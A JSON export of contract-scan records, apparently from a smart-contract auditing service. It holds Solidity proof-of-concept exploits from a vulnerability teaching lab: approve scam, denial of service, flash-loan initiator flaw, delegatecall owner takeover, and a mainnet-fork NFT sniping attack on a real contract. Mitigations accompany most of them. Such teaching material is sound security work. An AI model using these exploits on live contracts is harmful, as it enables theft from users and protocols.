[{"id":"01893d94-feaa-4a55-bba5-2ef3195b5b9e","session_key":"69272dc2-0c60-4dbd-b305-fc6580610038","contract_code":"\n// File: src/test/ApproveScam.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Over-Permissive Approve Scam\n\nDescription:\nThis vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.\n\nMitigation:\nUsers should only approve the amount of tokens necessary for the operation at hand. \n*/\n\ncontract ContractTest is Test {\n    ERC20 ERC20Contract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testApproveScam() public {\n        ERC20Contract = new ERC20();\n        ERC20Contract.mint(1000);\n        ERC20Contract.transfer(address(alice), 1000);\n\n        vm.prank(alice);\n        // Be Careful to grant unlimited amount to unknown website/address.\n        // Do not perform approve, if you are sure it's from a legitimate website.\n        // Alice granted approval permission to Eve.\n        ERC20Contract.approve(address(eve), type(uint256).max);\n\n        console.log(\n            \"Before exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\n            \"Due to Alice granted transfer permission to Eve, now Eve can move funds from Alice\"\n        );\n        vm.prank(eve);\n        // Now, Eve can move funds from Alice.\n        ERC20Contract.transferFrom(address(alice), address(eve), 1000);\n        console.log(\n            \"After exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ERC20 is IERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n\n\n\n// File: src/test/DOS.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Denial of Service\n\nDescription:\nThe KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. \n\nMitigation:\nUse a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.\n\nREF:\nhttps://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26\n*/\n\ncontract ContractTest is Test {\n    KingOfEther KingOfEtherContract;\n    Attack AttackerContract;\n\n    function setUp() public {\n        KingOfEtherContract = new KingOfEther();\n        AttackerContract = new Attack(KingOfEtherContract);\n    }\n\n    function testDOS() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 4 ether);\n        vm.deal(address(bob), 2 ether);\n        vm.prank(alice);\n        KingOfEtherContract.claimThrone{value: 1 ether}();\n        vm.prank(bob);\n        KingOfEtherContract.claimThrone{value: 2 ether}();\n        console.log(\n            \"Return 1 ETH to Alice, Alice of balance\",\n            address(alice).balance\n        );\n        AttackerContract.attack{value: 3 ether}();\n\n        console.log(\n            \"Balance of KingOfEtherContract\",\n            KingOfEtherContract.balance()\n        );\n        console.log(\"Attack completed, Alice claimthrone again, she will fail\");\n        vm.prank(alice);\n        vm.expectRevert(\"Failed to send Ether\");\n        KingOfEtherContract.claimThrone{value: 4 ether}();\n    }\n\n    receive() external payable {}\n}\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n\n\n","contract_language":"solidity","status":"analyzing","created_at":"2025-08-29T07:08:36.396Z","completed_at":null,"user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":null,"public_description":null,"tags":["github","repository","DeFiVulnLabs1demo"],"credits_used":33,"code_complexity":7,"is_pinned":false,"is_archived":false},{"id":"144b3804-05d2-4a36-9b49-6629d1d8ce02","session_key":"0888b600-4013-467e-9141-55d5595c259e","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:26:42.307Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"1928d5ca-dc13-45e7-b186-ec988fe8814f","session_key":"a6c069b2-7abc-45f3-9c15-5cd7f105e192","contract_code":"// File: Flashloan-flaw (1).sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Missing flash loan initiator check\n\nDescription:\nMissing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.\n\nMitigation:  \nCheck the initiator of the flash loan and revert if the initiator is not authorized.\n\nREF:\nhttps://twitter.com/ret2basic/status/1681150722434551809\nhttps://github.com/sherlock-audit/2023-05-dodo-judging/issues/34\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    LendingPool LendingPoolContract;\n    SimpleBankBug SimpleBankBugContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        LendingPoolContract = new LendingPool(address(USDaContract));\n        SimpleBankBugContract = new SimpleBankBug(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n        USDaContract.transfer(address(LendingPoolContract), 10000 ether);\n        FixedSimpleBankContract = new FixedSimpleBank(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n    }\n\n    function testFlashLoanFlaw() public {\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(SimpleBankBugContract),\n            \"0x0\"\n        );\n    }\n\n    function testFlashLoanSecure() public {\n        vm.expectRevert(\"Unauthorized\");\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(FixedSimpleBankContract),\n            \"0x0\"\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        address receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        // Mitigation: make sure to check the initiator\n        require(_initiator == address(this), \"Unauthorized\");\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ninterface IFlashLoanReceiver {\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external;\n}\n\ncontract LendingPool {\n    IERC20 public USDa;\n\n    constructor(address _USDA) {\n        USDa = IERC20(_USDA);\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDa.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(USDa.transfer(borrower, amount), \"Flashloan transfer failed\");\n        IFlashLoanReceiver(borrower).executeOperation(\n            amount,\n            borrower,\n            msg.sender,\n            data\n        );\n\n        uint256 balanceAfter = USDa.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n\n\n// File: Delegatecall.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Unsafe Delegatecall Vulnerability\n\nDescription:\nThe Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.\n\nScenario:\nProxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?\n\nMitigation:\nTo mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.\n*/\n \ncontract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    Proxy proxy;\n    Delegate DelegateContract;\n    address alice;\n\n    function setUp() public {\n        alice = vm.addr(1);\n    }\n\n    function testDelegatecall() public {\n        DelegateContract = new Delegate(); // logic contract\n        proxy = new Proxy(address(DelegateContract)); // proxy contract\n\n        console.log(\"Alice address\", alice);\n        console.log(\"DelegationContract owner\", proxy.owner());\n\n        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.\n        console.log(\"Change DelegationContract owner to Alice...\");\n        vm.prank(alice);\n        address(proxy).call(abi.encodeWithSignature(\"pwn()\")); // exploit here\n        // Proxy.fallback() will delegatecall Delegate.pwn()\n\n        console.log(\"DelegationContract owner\", proxy.owner());\n        console.log(\n            \"Exploit completed, proxy contract storage has been manipulated\"\n        );\n    }\n}\n\ncontract Delegate {\n    address public owner; // slot0\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\n\n// File: NFTMint_exposedMetadata.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nName: NFT Mint via Exposed Metadata Vulnerability\n\nDescription:\nThe contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed\n\nREF:\nhttps://twitter.com/Supremacy_CA/status/1596176732729769985\nhttps://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb\n*/\n \n\ncontract ContractTest is DSTest {\n    IFantasticWeslie nftContract =\n        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    bytes32[] merkleTreeProof;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16023847);\n    }\n\n    function testExploit() public {\n        //Since the contract is vulnerable to CVE-2022-38217\n        //it could lead to the early disclosure of metadata of all NFTs in the project\n        //As a result, attacker can find out valuable NFTs and then target mint specified NFTs by monitoring Mempool and sell the NFTs for a profit in secondary market\n\n        //For example, Lets assume the attacker finds out that NFT#142 is a rare NFT, now he just has to moniter the mempool till NFT#141 is minted and then mint NFT#142\n        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json\n        //The issue is the metadata should be visible after the minting is completed\n\n        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b\n        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83\n\n        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;\n        cheats.prank(attacker);\n\n        merkleTreeProof.push(\n            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6\n        );\n        merkleTreeProof.push(\n            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd\n        );\n        merkleTreeProof.push(\n            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c\n        );\n        merkleTreeProof.push(\n            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604\n        );\n        merkleTreeProof.push(\n            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c\n        );\n        merkleTreeProof.push(\n            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808\n        );\n        merkleTreeProof.push(\n            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f\n        );\n        merkleTreeProof.push(\n            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1\n        );\n        merkleTreeProof.push(\n            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922\n        );\n        merkleTreeProof.push(\n            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e\n        );\n        merkleTreeProof.push(\n            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e\n        );\n        merkleTreeProof.push(\n            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0\n        );\n\n        nftContract.mint{value: 0.12 ether}(merkleTreeProof);\n\n        console.log(\"Owner of NFT#142 : \", nftContract.ownerOf(142));\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-08-28T12:01:18.385Z","completed_at":"2025-08-28T12:03:04.825Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":null,"public_description":null,"tags":[],"credits_used":44,"code_complexity":10,"is_pinned":false,"is_archived":false},{"id":"1e54c66f-11a9-4ecf-bc34-f721cd0261d0","session_key":"6515d2aa-d8de-4212-91d3-167288376704","contract_code":"// File: Delegatecall.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Unsafe Delegatecall Vulnerability\n\nDescription:\nThe Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that\nallows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.\nThe vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. \ndelegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context \nof the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.\nThis allows a smart contract to dynamically load code from a different address at runtime.\n\nScenario:\nProxy Contract is designed for helping users call logic contract\nProxy Contract's owner is hardcoded as 0xdeadbeef\nCan you manipulate Proxy Contract's owner ?\n\nMitigation:\nTo mitigate the Proxy Contract Owner Manipulation Vulnerability, \navoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. \nIf the delegatecall is necessary for the contract's functionality, make sure to validate and \nsanitize inputs to avoid unexpected behaviors.\n*/\n \ncontract Proxy {\n    address public owner = address(0xdeadbeef); // slot0\n    Delegate delegate;\n\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n    }\n\n    fallback() external {\n        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable\n        require(suc, \"Delegatecall failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    Proxy proxy;\n    Delegate DelegateContract;\n    address alice;\n\n    function setUp() public {\n        alice = vm.addr(1);\n    }\n\n    function testDelegatecall() public {\n        DelegateContract = new Delegate(); // logic contract\n        proxy = new Proxy(address(DelegateContract)); // proxy contract\n\n        console.log(\"Alice address\", alice);\n        console.log(\"DelegationContract owner\", proxy.owner());\n\n        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.\n        console.log(\"Change DelegationContract owner to Alice...\");\n        vm.prank(alice);\n        address(proxy).call(abi.encodeWithSignature(\"pwn()\")); // exploit here\n        // Proxy.fallback() will delegatecall Delegate.pwn()\n\n        console.log(\"DelegationContract owner\", proxy.owner());\n        console.log(\n            \"Exploit completed, proxy contract storage has been manipulated\"\n        );\n    }\n}\n\ncontract Delegate {\n    address public owner; // slot0\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-09-01T09:42:40.700Z","completed_at":"2025-09-01T09:44:04.204Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":null,"public_description":null,"tags":[],"credits_used":21,"code_complexity":3,"is_pinned":false,"is_archived":false},{"id":"24a821c0-2ebf-4238-b4e2-887afefd6506","session_key":"d4c90d8a-bc74-451d-8e92-395be16c1d92","contract_code":"\n// File: src/test/Dirtybytes.sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n// the issue is fixed in 0.8.15\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Dirtybytes in > Solidity 0.8.15\n    \"description\": \"Copying ``bytes`` arrays from memory or calldata to storage is done in chunks of 32 bytes even if the length is not a multiple of 32. \n    Thereby, extra bytes past the end of the array may be copied from calldata or memory to storage. \n    These dirty bytes may then become observable after a ``.push()`` without arguments to the bytes array in storage,\n    i.e. such a push will not result in a zero value at the end of the array as expected. \n    This bug only affects the legacy code generation pipeline, the new code generation pipeline via IR is not affected.\"\n    \n    \"link\": https://blog.soliditylang.org/2022/06/15/dirty-bytes-array-to-storage-bug/\n    \"fixed\": 0.8.15\n\n*/\n\ncontract ContractTest is Test {\n    Dirtybytes Dirtybytesontract;\n\n    function testDirtybytes() public {\n        Dirtybytesontract = new Dirtybytes();\n        emit log_named_bytes(\n            \"Array element in h() not being zero::\",\n            Dirtybytesontract.h()\n        );\n        console.log(\n            \"Such that the byte after the 63 bytes allocated below will be 0x02.\"\n        );\n    }\n}\n\ncontract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n\n\n\n// File: src/test/DOS.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Denial of Service\n\nDescription:\nThe KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. \n\nMitigation:\nUse a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.\n\nREF:\nhttps://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26\n*/\n\ncontract ContractTest is Test {\n    KingOfEther KingOfEtherContract;\n    Attack AttackerContract;\n\n    function setUp() public {\n        KingOfEtherContract = new KingOfEther();\n        AttackerContract = new Attack(KingOfEtherContract);\n    }\n\n    function testDOS() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 4 ether);\n        vm.deal(address(bob), 2 ether);\n        vm.prank(alice);\n        KingOfEtherContract.claimThrone{value: 1 ether}();\n        vm.prank(bob);\n        KingOfEtherContract.claimThrone{value: 2 ether}();\n        console.log(\n            \"Return 1 ETH to Alice, Alice of balance\",\n            address(alice).balance\n        );\n        AttackerContract.attack{value: 3 ether}();\n\n        console.log(\n            \"Balance of KingOfEtherContract\",\n            KingOfEtherContract.balance()\n        );\n        console.log(\"Attack completed, Alice claimthrone again, she will fail\");\n        vm.prank(alice);\n        vm.expectRevert(\"Failed to send Ether\");\n        KingOfEtherContract.claimThrone{value: 4 ether}();\n    }\n\n    receive() external payable {}\n}\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n\n\n","contract_language":"solidity","status":"completed","created_at":"2025-08-29T07:13:10.183Z","completed_at":"2025-08-29T07:15:09.739Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":null,"public_description":null,"tags":["github","repository","DeFiVulnLabs1demo"],"credits_used":27,"code_complexity":5,"is_pinned":false,"is_archived":false},{"id":"2ef93aee-33ff-4295-9209-cff6602e9e54","session_key":"1c81e874-f660-4e3a-8b24-58c56ae06e5c","contract_code":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Library for reading and writing primitive types to specific storage slots.\r\n *\r\n * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.\r\n * This library helps with reading and writing to such slots without the need for inline assembly.\r\n *\r\n * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.\r\n *\r\n * Example usage to set ERC1967 implementation slot:\r\n * ```\r\n * contract ERC1967 {\r\n *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\r\n *\r\n *     function _getImplementation() internal view returns (address) {\r\n *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\r\n *     }\r\n *\r\n *     function _setImplementation(address newImplementation) internal {\r\n *         require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\r\n *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;\r\n *     }\r\n * }\r\n * ```\r\n *\r\n * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._\r\n */\r\nlibrary StorageSlot {\r\n    struct AddressSlot {\r\n        address value;\r\n    }\r\n\r\n    struct BooleanSlot {\r\n        bool value;\r\n    }\r\n\r\n    struct Bytes32Slot {\r\n        bytes32 value;\r\n    }\r\n\r\n    struct Uint256Slot {\r\n        uint256 value;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `AddressSlot` with member `value` located at `slot`.\r\n     */\r\n    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.\r\n     */\r\n    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.\r\n     */\r\n    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.\r\n     */\r\n    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     * [IMPORTANT]\r\n     * ====\r\n     * It is unsafe to assume that an address for which this function returns\r\n     * false is an externally-owned account (EOA) and not a contract.\r\n     *\r\n     * Among others, `isContract` will return false for the following\r\n     * types of addresses:\r\n     *\r\n     *  - an externally-owned account\r\n     *  - a contract in construction\r\n     *  - an address where a contract will be created\r\n     *  - an address where a contract lived, but was destroyed\r\n     * ====\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies on extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n\r\n        uint256 size;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { size := extcodesize(account) }\r\n        return size > 0;\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to 